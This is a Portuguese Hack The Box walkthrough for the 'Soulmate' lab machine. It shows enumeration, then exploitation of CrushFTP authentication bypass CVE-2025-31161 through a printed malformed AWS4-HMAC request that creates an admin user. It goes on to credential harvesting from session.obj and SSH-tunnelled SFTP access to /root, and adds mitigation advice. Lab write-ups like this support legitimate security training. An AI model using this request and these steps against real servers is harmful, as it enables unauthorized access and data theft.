---
title: "Hack The Box - Soulmate"
author: imendes
date: 2026-01-18
subject: "Hack The Box Walkthrough"
description: "Walkthrough da máquina Soulmate (HTB), explorando bypass de autenticação no CrushFTP para obtenção de acesso inicial e posterior escalada de privilégios."
keywords: [Markdown, HTB, Penetration Testing]
subtitle: "HTB Machine Soulmate"
lang: "pt-br"
titlepage: true
titlepage-color: "DC143C"
titlepage-text-color: "FFFFFF"
titlepage-rule-color: "FFFFFF"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
categories: [Hack The Box Machines, Linux, Easy]
---

## Introdução

Este relatório documenta os achados de um teste de penetração conduzido na máquina Soulmate do ambiente Hack The Box.

A análise revelou uma vulnerabilidade crítica de bypass de autenticação no serviço CrushFTP (CVE-2025-31161), que permitiu a criação de usuários administrativos sem credenciais válidas. Essa falha foi explorada para obter acesso a arquivos de log do CrushFTP, com credenciais que permitiram acesso inicial ao sistema por SSH. A escalada de privilégios foi alcançada explorando sftp do sistema para copiar arquivos do diretório `/root` para locais acessíveis, resultando no comprometimento total do sistema.

Todas as vulnerabilidades identificadas foram exploradas com sucesso, demonstrando um risco de segurança crítico que permite desde o acesso inicial até a exfiltração completa de dados sensíveis.

### Recomendações

Para mitigar as vulnerabilidades identificadas neste relatório, as seguintes ações são recomendadas:

- **Gerenciamento de Patches**: Atualizar imediatamente o serviço CrushFTP para a versão 10.8.4+ ou 11.3.1+ que corrige a vulnerabilidade CVE-2025-31161.
- **Gestão de Logs**: Implementar rotação e limpeza adequada de logs que possam conter informações sensíveis como senhas. Logs nunca devem armazenar credenciais em texto claro.
- **Segregação de Permissões**: serviços internos como sftp devem ter permissões restritas e não devem permitir acesso a diretórios sensíveis do sistema.

## Metodologia

O teste de penetração foi realizado utilizando uma abordagem estruturada, consistindo em várias fases para identificar e explorar vulnerabilidades de forma eficaz:

- **Coleta de Informações (Information Gathering)**: Identificação do endereço IP do alvo e mapeamento inicial da infraestrutura.
- **Enumeração de Serviços (Service Enumeration)**: Análise detalhada de portas abertas, serviços em execução e descoberta de subdomínios.
- **Exploração (Exploitation)**: Aproveitamento da vulnerabilidade CVE-2025-31161 para obter acesso administrativo e estabelecer presença inicial no sistema.
- **Manutenção de Acesso**: Análise de logs para descoberta de credenciais e estabelecimento de acesso SSH.
- **Escalada de Privilégios (Privilege Escalation)**: Exploração das funcionalidades sftp para exfiltração de arquivos sensíveis do diretório root.
- **Limpeza (House Cleaning)**: Remoção de todos os artefatos para restaurar a máquina ao seu estado original.

## Coleta de Informações

**Endereço IP do Alvo**

10.10.11.86

**Endereço IP do Atacante**

10.10.16.38

### Enumeração de Serviços

A enumeração inicial foi conduzida utilizando `nmap` para identificar as portas abertas e os serviços em execução na máquina alvo:

```bash
nmap -Pn -sV -oA nmap 10.10.11.86
```

**Resultado da Varredura:**

```
# Nmap 7.94SVN scan initiated Sun Sep 21 21:16:19 2025
Nmap scan report for 10.10.11.86
Host is up (0.72s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Resumo dos Serviços:**

Server IP Address | Ports Open
------------------|----------------------------------------
10.10.11.86       | **TCP**: 22, 80

**Detalhes dos Serviços:**

- **Porta 22/TCP**: OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
- **Porta 80/TCP**: nginx 1.18.0 (Ubuntu)

Na porta 80, foi identificado um redirecionamento para o domínio `soulmate.htb`. Para resolver o nome de domínio, a seguinte entrada foi adicionada ao arquivo `/etc/hosts`:

```bash
# Ajuste de resolução de nome
echo "10.10.11.86 soulmate.htb" | sudo tee -a /etc/hosts
```

### Enumeração Web Inicial

O site principal apresenta uma aplicação de relacionamentos (dating website) com funcionalidades de:
- Registro e login de usuários
- Criação de perfil
- Navegação de perfis de membros
- Painel administrativo restrito (`dashboard.php`)

Uma análise posterior do código-fonte revelou que existe um parâmetro `id_admin` no banco de dados que determina privilégios administrativos. O sistema também implementa proteção contra força bruta, bloqueando tentativas com os usernames: `administrator`, `admin` e `root`.

### Enumeração de VHosts

Um scan com `ffuf` foi utilizado para identificar subdomínios adicionais:

```bash
ffuf -u http://10.10.11.86 \
  -w /opt/SecLists/Discovery/DNS/service-names.txt:FUZZ \
  -H 'Host: FUZZ.soulmate.htb' \
  -mc all -fw 4
```

Este scan identificou o vhost `ftp.soulmate.htb`, que foi adicionado ao arquivo `/etc/hosts`:

```bash
# Ajuste de resolução de nome
echo "10.10.11.86 ftp.soulmate.htb" | sudo tee -a /etc/hosts
```

### Análise do Serviço CrushFTP

Ao acessar `http://ftp.soulmate.htb`, foi exibida uma interface de login do CrushFTP.

## Exploração

### Vulnerabilidade: CVE-2025-31161 - Bypass de Autenticação CrushFTP

**Explicação da Vulnerabilidade:**

A CVE-2025-31161 é uma vulnerabilidade crítica que afeta as versões 10.0.0 até 10.8.3 e 11.0.0 até 11.3.0 do CrushFTP. Esta falha permite que um atacante não autenticado crie contas de usuário com privilégios administrativos ao explorar uma condição de corrida no método de autorização AWS4-HMAC do componente HTTP.

A vulnerabilidade reside no processo de autenticação onde o servidor primeiro verifica a existência do usuário chamando `login_user_pass()` sem requisito de senha. Ao enviar um cabeçalho AWS4-HMAC malformado contendo apenas o nome de usuário seguido de uma barra (`/`), o servidor autentica a sessão através do processo de verificação HMAC mas falha na verificação subsequente do usuário, permitindo o bypass completo da autenticação.

**Severidade**: Crítica (CVSS 9.8)

**CVSS Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**Impacto:**
- Criação de usuários com privilégios administrativos sem credenciais
- Acesso completo à interface administrativa do CrushFTP
- Capacidade de fazer upload de arquivos maliciosos
- Reset de senhas de usuários existentes

### Prova de Conceito (PoC)

Para explorar esta vulnerabilidade, foi utilizado o exploit público disponível no Exploit-DB:

**Referência**: https://www.exploit-db.com/exploits/52295
```bash
# Executando o exploit para criar usuário administrativo
python3 exploit.py \
  --target ftp.soulmate.htb \
  --exploit \
  --new-user testuser \
  --password user-password \
  --port 80
```

**Requisição HTTP Explorada:**

```http
POST /WebInterface/function/ HTTP/1.1
Host: ftp.soulmate.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0
Accept: */*
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Content-Length: 209
Origin: http://ftp.soulmate.htb
Connection: keep-alive
Referer: http://ftp.soulmate.htb/WebInterface/login.html
Cookie: CrushAuth=1758502192506_LgxKVMwtXF8OQAw2btdY37mMvw4321
Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/
Priority: u=0

command=setUserItem&xmlItem=user&username=testuser&serverGroup=MainUsers&data_action=replace
&c2f=4321&user=<?xml+version="1.0"+encoding="UTF-8"?><user+type="properties">
<password>user-password</password></user>
```

**Saída do Exploit:**

```
Exploiting 1 targets with 10 threads...
[+] Successfully created user testuser on ftp.soulmate.htb
Exploiting targets... ------------------------------- 100% (1/1) 0:00:00

Exploitation complete! Successfully exploited 1/1 targets.

Exploited Targets:
→ ftp.soulmate.htb

Summary:
Total targets: 1
Vulnerable targets: 0
Exploited targets: 1
```

A execução bem-sucedida do exploit permitiu a criação de um usuário administrativo, fornecendo acesso completo à interface de gerenciamento do CrushFTP.

### Acesso Administrativo

Após o login com as credenciais criadas (`testuser:user-password`), foi possível acessar a interface administrativa em:

```
http://ftp.soulmate.htb/WebInterface/UserManager/index.html
```

Na interface de gerenciamento, diversas funcionalidades administrativas estavam disponíveis:
- Gerenciamento de usuários
- Configuração de VFS (Virtual File System)
- Acesso a logs do sistema

\newpage

## Manutenção de Acesso

### Exfiltração de Arquivos de Configuração do CrushFTP

Utilizando os privilégios administrativos obtidos através da conta `testuser`, foi possível acessar o gerenciador de usuários e arquivos do CrushFTP:

**Interface Administrativa:** `http://ftp.soulmate.htb/WebInterface/UserManager/index.html`

#### Configuração de VFS para Acesso aos Arquivos

1. Acessar o gerenciador de usuários
2. Selecionar o usuário `testuser` (criado anteriormente)
3. Passar os arquivos "Server Files" para "User's Stuff". Em particular o diretório `/app/CrushFTP11/`
4. Salvar as alterações

Com esta configuração, foi possível navegar pelos diretórios internos do CrushFTP através da interface web.

#### Download de Arquivos Sensíveis

Após configurar o VFS, foi possível fazer login como `testuser` e acessar o diretório raiz da instalação do CrushFTP:

```bash
# Via interface web
http://ftp.soulmate.htb/WebInterface/jQuery/fileTree.html

# Ou via cliente FTP
ftp ftp.soulmate.htb
# Login: testuser
# Password: user-password
```

**Arquivos Críticos Baixados:**

```
session.obj
prefs.XML
user.XML
backup/
```

#### Análise do Arquivo session.obj

O arquivo `session.obj` contém informações de sessões ativas e credenciais cacheadas. Após fazer o download, foi realizada uma análise:

```bash
# Download do arquivo
wget http://ftp.soulmate.htb/WebInterface/function/?command=download&path=/session.obj

# Análise do conteúdo
strings session.obj | code -
```

**Credenciais Descobertas no session.obj:**

```
[PASS1]
[PASS2]
[BEN_PASS]
```
### Descoberta de Informações do Sistema

A enumeração revelou detalhes importantes sobre o ambiente:

**Sistema Operacional:**
```
ID=wolfi
VERSION_ID="20230201"
```

O sistema está executando Wolfi, uma distribuição Linux minimalista orientada para containers. Indicadores adicionais confirmaram ambiente containerizado:

- Hostname alfanumérico: `80167f27223f` e `e5f5e5e00167`
- Arquivo `resolv.conf` gerado pelo Docker Engine
- Presença de IP de rede Docker no `/etc/hosts`: `172.19.0.2`
- Sistema de arquivos montado via Docker (verificado em `/proc/mounts`)

### Acesso SSH como ben

Na tentativa de descobrir o uso das credenciais obtidas, foi testado o acesso SSH utilizando os usuários identificados no CrushFTP. A senha descoberta no arquivo de log ([BEN_PASS]) permitiu autenticação SSH bem-sucedida com o usuário ben:

```bash
ssh ben@10.10.11.86
```

```
ben@soulmate:~$ id
uid=1000(ben) gid=1000(ben) groups=1000(ben)

ben@soulmate:~$ cat user.txt
[FLAG_USER]
```

A flag de usuário foi recuperada com sucesso do diretório home de `ben`.

## Escalada de Privilégios

### Análise de Privilégios

Verificação de permissões sudo:
```bash
ben@soulmate:~$ sudo -l
Sorry, user ben may not run sudo on soulmate.
```

O usuário `ben` não possui privilégios sudo. Verificação de binários SUID também não revelou vetores óbvios de escalada.

### Enumeração de Portas Locais

Após obter acesso SSH como `ben`, foi iniciada a enumeração de serviços internos executando na máquina:
```bash
ben@soulmate:~$ ss -tunl
Netid    State     Recv-Q    Send-Q         Local Address:Port       Peer Address:Port    Process
udp      UNCONN    0         0              127.0.0.53%lo:53              0.0.0.0:*
tcp      LISTEN    0         4096               127.0.0.1:4369            0.0.0.0:*
tcp      LISTEN    0         4096               127.0.0.1:8443            0.0.0.0:*
tcp      LISTEN    0         4096           127.0.0.53%lo:53              0.0.0.0:*
tcp      LISTEN    0         5                  127.0.0.1:2222            0.0.0.0:*
tcp      LISTEN    0         4096               127.0.0.1:9090            0.0.0.0:*
tcp      LISTEN    0         128                127.0.0.1:44925           0.0.0.0:*
tcp      LISTEN    0         511                  0.0.0.0:80              0.0.0.0:*
tcp      LISTEN    0         4096               127.0.0.1:8080            0.0.0.0:*
tcp      LISTEN    0         128                  0.0.0.0:22              0.0.0.0:*
tcp      LISTEN    0         4096               127.0.0.1:46607           0.0.0.0:*
tcp      LISTEN    0         4096                   [::1]:4369               [::]:*
tcp      LISTEN    0         511                     [::]:80                 [::]:*
tcp      LISTEN    0         128                     [::]:22                 [::]:*
```

**Descoberta**: A porta **2222** estava escutando em localhost, identificada como um serviço interno do sistema.

### Identificação do Serviço SFTP

Durante a exploração da interface web administrativa do CrushFTP, foram identificados indicativos de que um serviço FTP/SFTP estava executando na porta 2222.

Esta descoberta sugeriu que o CrushFTP estava operando um servidor SFTP adicional acessível apenas localmente.

### Tunelamento SSH para Acesso ao Serviço SFTP

Para acessar o serviço SFTP executando em `localhost:2222`, foi estabelecido um túnel SSH a partir da máquina atacante:
```bash
# Criar túnel SSH
ssh -L 2222:127.0.0.1:2222 ben@10.10.11.86
```

Com o túnel estabelecido, o serviço SFTP local tornou-se acessível através de `localhost:2222` na máquina do atacante.

### Acesso via Cliente SFTP

Utilizando as credenciais de `ben`, foi possível autenticar no serviço SFTP:
```bash
sftp -P 2222 ben@localhost
```

**Resultado:**
```
Connected to localhost.
sftp>
```

### Exploração do Sistema de Arquivos via SFTP

Após autenticação bem-sucedida, foi realizada a exploração do sistema de arquivos:
```bash
sftp> pwd
Remote working directory: /

sftp> cd /root
sftp> ls
root.txt  scripts
```

**Descoberta Crítica**: O serviço SFTP do CrushFTP estava configurado com permissões que permitiam navegação irrestrita no sistema de arquivos, incluindo acesso completo ao diretório `/root`.
Assim, é possível realizar: 
```bash
sftp> get root.txt
```
e ler o conteúdo da flag.

## Limpeza

Após a conclusão do teste de penetração e captura das flags de usuário e root, todos os artefatos foram removidos do sistema:
